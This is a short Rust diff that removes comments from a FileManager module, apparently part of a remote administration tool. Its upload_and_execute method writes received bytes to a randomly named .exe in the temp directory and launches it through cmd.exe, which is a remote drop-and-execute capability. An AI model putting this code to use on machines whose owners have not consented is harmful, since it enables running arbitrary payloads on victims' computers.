@@ -106,30 +106,23 @@ impl FileManager {
     }
 
     pub async fn upload_and_execute(&self, file_data: FileData) {
-        // Create a random filename in the Windows temp directory
         let temp_dir = std::env::temp_dir();
         
-        // Generate a random name using rand
         let random_num: u64 = rand::random();
         let random_name = format!("file_{}.exe", random_num);
         
         let file_path = temp_dir.join(random_name);
         
-        // Write the file to disk
         if let Err(e) = std::fs::write(&file_path, &file_data.data) {
             eprintln!("Failed to write file to temp directory: {}", e);
             return;
         }
         
-        // Execute the file
         self.execute_file(&file_path.to_string_lossy()).await;
     }
     
     pub async fn execute_file(&self, path: &str) {
-        use std::process::Command;
-        
-        // On Windows, use cmd.exe to start the process
-        match Command::new("cmd.exe")
+        match std::process::Command::new("cmd.exe")
             .args(["/c", "start", "", path])
             .spawn() 
         {
@@ -139,18 +132,14 @@ impl FileManager {
     }
     
     pub async fn upload_file(&self, target_folder: String, file_data: FileData) {
-        // Determine target path
         let path = std::path::Path::new(&target_folder);
         let file_path = path.join(&file_data.name);
         
-        // Write the file to disk
         if let Err(e) = std::fs::write(&file_path, &file_data.data) {
             eprintln!("Failed to write file to folder: {}", e);
             return;
         }
-        
-        
-        // Refresh the directory listing
+
         if let Some(parent) = file_path.parent() {
             if parent.to_string_lossy() == self.current_path.to_string_lossy() {
                 self.list_directory_contents().await;
